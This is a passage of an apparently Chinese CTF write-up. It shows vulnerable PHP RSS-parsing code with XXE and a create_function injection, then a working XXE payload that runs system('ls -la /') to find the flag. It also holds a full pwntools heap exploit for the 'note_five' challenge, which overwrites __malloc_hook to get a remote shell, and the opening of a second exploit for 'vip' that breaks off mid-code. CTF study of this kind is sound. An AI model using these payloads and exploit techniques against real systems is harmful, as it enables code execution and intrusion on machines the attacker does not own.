class="variable">$post</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$cookie</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_COOKIE, <span class="variable">$cookie</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$headers</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HTTPHEADER, <span class="variable">$headers</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_TIMEOUT, <span class="number">5</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">curl_errno</span>(<span class="variable">$curl</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">curl_error</span>(<span class="variable">$curl</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$header</span>, <span class="variable">$body</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;\r\n\r\n&quot;</span>, <span class="variable">$data</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$info</span>[<span class="string">&#x27;header&#x27;</span>] = <span class="variable">$header</span>;</span><br><span class="line">        <span class="variable">$info</span>[<span class="string">&#x27;body&#x27;</span>] = <span class="variable">$body</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$info</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="variable">$rss</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$rss</span>=<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$rss</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOENT);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$rss</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>View&#x2F;Admin.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] != <span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;;(&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&#x27;package/header.php&#x27;</span>) <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="variable">$rss</span>) &#123;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">rss</span>-<span class="title">head</span> <span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h1</span>&gt;<span class="title">RSS</span>解析失败&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span>&gt;此网站<span class="title">RSS</span>资源可能存在错误无法解析&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span>&gt;此网站<span class="title">RSS</span>资源可能已经关闭&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span>&gt;此网站可能禁止<span class="title">PHP</span>获取此内容&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span>&gt;可能由于来自本站的访问过多导致暂时访问限制<span class="title">Orz</span>&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">    <span class="title">exit</span>;</span></span><br><span class="line"><span class="class">&#125;;</span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">rss_sort_date</span>($<span class="title">str</span>)</span>&#123;</span><br><span class="line">    <span class="variable">$time</span>=<span class="title function_ invoke__">strtotime</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y年m月d日 H时i分&quot;</span>,<span class="variable">$time</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">rss</span>-<span class="title">head</span> <span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">sm</span>-12 <span class="title">text</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h1</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">rss</span>-&gt;<span class="title">channel</span>-&gt;<span class="title">link</span>;?&gt;&quot; <span class="title">target</span>=&quot;<span class="title">_blank</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">rss</span>-&gt;<span class="title">channel</span>-&gt;<span class="title">title</span>;?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">span</span> <span class="title">style</span>=&quot;<span class="title">font</span>-<span class="title">size</span>: 16<span class="title">px</span>;<span class="title">font</span>-<span class="title">style</span>: <span class="title">italic</span>;<span class="title">width</span>:100%;&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">rss</span>-&gt;<span class="title">channel</span>-&gt;<span class="title">link</span>;?&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">rss</span>-&gt;<span class="title">channel</span>-&gt;<span class="title">description</span>;?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            <span class="title">if</span>(<span class="title">isset</span>($<span class="title">rss</span>-&gt;<span class="title">channel</span>-&gt;<span class="title">lastBuildDate</span>)&amp;&amp;$<span class="title">rss</span>-&gt;<span class="title">channel</span>-&gt;<span class="title">lastBuildDate</span>!=&quot;&quot;)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; 最后更新:&quot;</span>.<span class="title function_ invoke__">rss_sort_date</span>(<span class="variable">$rss</span>-&gt;channel-&gt;lastBuildDate).<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>-<span class="title">list</span>&quot; <span class="title">style</span>=&quot;<span class="title">padding</span>:10<span class="title">px</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">    $<span class="title">data</span> = [];</span></span><br><span class="line"><span class="class">    <span class="title">foreach</span>($<span class="title">rss</span>-&gt;<span class="title">channel</span>-&gt;<span class="title">item</span> <span class="title">as</span> $<span class="title">item</span>)</span>&#123;</span><br><span class="line">        <span class="variable">$data</span>[] = <span class="variable">$item</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">usort</span>(<span class="variable">$data</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return strcmp($a-&gt;&#x27;</span>.<span class="variable">$order</span>.<span class="string">&#x27;,$b-&gt;&#x27;</span>.<span class="variable">$order</span>.<span class="string">&#x27;);&#x27;</span>));</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$item</span>)&#123;    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">        &lt;article <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h1</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">item</span>-&gt;<span class="title">link</span>;?&gt;&quot; <span class="title">target</span>=&quot;<span class="title">_blank</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">item</span>-&gt;<span class="title">title</span>;?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">item</span>-&gt;<span class="title">description</span>;?&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">article</span>-<span class="title">info</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">i</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:0<span class="title">px</span> 5<span class="title">px</span>&quot;&gt;&lt;/<span class="title">i</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">rss_sort_date</span>($<span class="title">item</span>-&gt;<span class="title">pubDate</span>);?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">i</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:0<span class="title">px</span> 5<span class="title">px</span>&quot;&gt;&lt;/<span class="title">i</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                    <span class="title">for</span>($<span class="title">i</span>=0;$<span class="title">i</span>&lt;<span class="title">count</span>($<span class="title">item</span>-&gt;<span class="title">category</span>);$<span class="title">i</span>++)</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$item</span>-&gt;category[<span class="variable">$i</span>];</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$i</span>+<span class="number">1</span>!=<span class="title function_ invoke__">count</span>(<span class="variable">$item</span>-&gt;category))&#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;,&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$item</span>-&gt;author)&amp;&amp;<span class="variable">$item</span>-&gt;author!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">                        &lt;i <span class="class"><span class="keyword">class</span>=&quot;<span class="title">fa</span> <span class="title">fa</span>-<span class="title">user</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>:0<span class="title">px</span> 5<span class="title">px</span>&quot;&gt;&lt;/<span class="title">i</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                        <span class="title">echo</span> $<span class="title">item</span>-&gt;<span class="title">author</span>;</span></span><br><span class="line"><span class="class">                    &#125;</span></span><br><span class="line"><span class="class">                ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">article</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> &#125;?&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    免责声明:本站只提供<span class="title">RSS</span>解析,解析内容与本站无关,版权归来源网站所有</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">include</span>(&#x27;<span class="title">package</span>/<span class="title">footer</span>.<span class="title">php</span>&#x27;) ?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到<code>usort($data, create_function(&#39;$a, $b&#39;, &#39;return strcmp($a-&gt;&#39;.$order.&#39;,$b-&gt;&#39;.$order.&#39;);&#39;));</code>，可以进行代码注入，<br>在xxe中构造<code>php://filter/convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=http%3A%2F%2F122.112.199.14%2Fexample&amp;order=id%2Cid)%3B%7D%3Bdie(system(&#39;ls%20-la%20%2F&#39;))%3B%2F*</code>，直接用<code>system</code>执行列目录就行，在<code>/flag_eb8ba2eb07702e69963a7d6ab8669134</code>拿到 flag</p>
<h2><span id="pwn">Pwn</span><a href="#pwn" class="header-anchor"></a></h2><h3><span id="note-five">note_five</span><a href="#note-five" class="header-anchor"></a></h3><p>unsortedbin attack and fastbin attack</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&quot;./note_five&quot;</span>)</span><br><span class="line">a = e.libc</span><br><span class="line">p = remote(<span class="string">&quot;112.126.103.195&quot;</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>):</span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    p.sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    p.sl(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>,<span class="number">0xe8</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0xe8</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0xe8</span>)</span><br><span class="line">create(<span class="number">3</span>,<span class="number">0xe8</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0xe8</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0x2d0</span>)+<span class="string">&quot;\xf0&quot;</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0</span>,<span class="number">0x2d0</span> - <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+<span class="string">&quot;c&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>))</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># overlap it</span></span><br><span class="line">pay = <span class="string">&#x27;b&#x27;</span> * <span class="number">0xe0</span></span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) + p16(<span class="number">0x37f8</span> - <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,pay)</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>,<span class="number">0xe8</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>,<span class="number">0xe8</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;\x33&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+<span class="string">&quot;\x33&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>))</span><br><span class="line"></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;\x33&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+<span class="string">&quot;\x33&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p16(<span class="number">0x25cf</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>,<span class="number">0xe8</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0xe8</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&quot;a&quot;</span>*<span class="number">9</span>+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>))</span><br><span class="line">p.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">24</span>)</span><br><span class="line">libc_createress = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x3c5600</span></span><br><span class="line"><span class="comment"># fastbin attack !!</span></span><br><span class="line">pian = <span class="number">0x7ffff7dd1b10</span> - <span class="number">0x7ffff7dd196f</span></span><br><span class="line">malloc_hook_one = a.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]-pian+libc_createress</span><br><span class="line">malloc_hook_two = a.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]-<span class="number">0xc0</span>+libc_createress</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+<span class="string">&quot;b&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(malloc_hook_one))</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>,<span class="number">0xe8</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0xe8</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(libc_createress+<span class="number">0x3c36e0</span>)+p64(<span class="number">0</span>)*<span class="number">22</span>+p64(<span class="number">0xff</span>))</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;\x33&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+<span class="string">&quot;\x33&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(malloc_hook_two))</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>,<span class="number">0xe8</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0xe8</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">21</span> + p64(libc_createress+<span class="number">0x4526a</span>)+ p64(a.symbols[<span class="string">&quot;__libc_realloc&quot;</span>]+<span class="number">13</span>+libc_createress))</span><br><span class="line">create(<span class="number">3</span>,<span class="number">0xe0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3><span id="vip">vip</span><a href="#vip" class="header-anchor"></a></h3><p>利用随机数爆破fd 改指针使得可以edit 然后攻击list getshell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./vip&quot;)</span></span><br><span class="line">e = ELF(<span class="string">&quot;./vip&quot;</span>)</span><br><span class="line">a = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;112.126.103.14&quot;</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>):</span><br><span class="line">    p.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">x</span>):</span><br><span class="line">    p.recvunitl(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx</span>):</span><br><span class="line">    p.rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    